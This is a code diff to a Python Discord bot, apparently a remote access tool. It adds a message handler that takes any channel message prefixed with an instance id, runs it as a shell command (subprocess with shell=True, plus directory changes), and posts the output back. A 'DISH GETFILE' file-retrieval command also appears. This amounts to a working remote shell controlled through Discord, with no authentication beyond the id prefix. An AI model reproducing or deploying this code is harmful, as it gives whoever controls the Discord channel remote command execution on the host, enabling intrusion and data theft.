@@ -24,7 +24,38 @@ async def on_ready():
 
 @client.event
 async def on_message(message):
+    
+    print("\n=======   ")
+    print("Message: ")
+    print(message.content)
+    print("++++++++ \n")
 
+    idString = "[" + id + "]! "
+    if message.content.startswith(idString): 
+
+        command = message.content.split(idString)[1]
+        print(message.content)
+        print(command)
+
+        ### This bit is repeated code, and needs to be fixed 
+
+        # just running "cd" doesn't change the wd or the pythin script
+        if command.startswith("cd"):
+            path = command.split("cd ")[1]
+            os.chdir(path)
+            return 
+        
+
+        # I wan't to find a better way of doing this. It has some issues 
+        result = subprocess.check_output(command, shell=True, text=True)
+
+        if result == "": 
+            await message.channel.send("Command produced no output")
+            return 
+        
+        
+        await message.channel.send(result)
+        return
 
     if message.content.startswith("DISH GETFILE"):
         await message.channel.send ("Getting file")
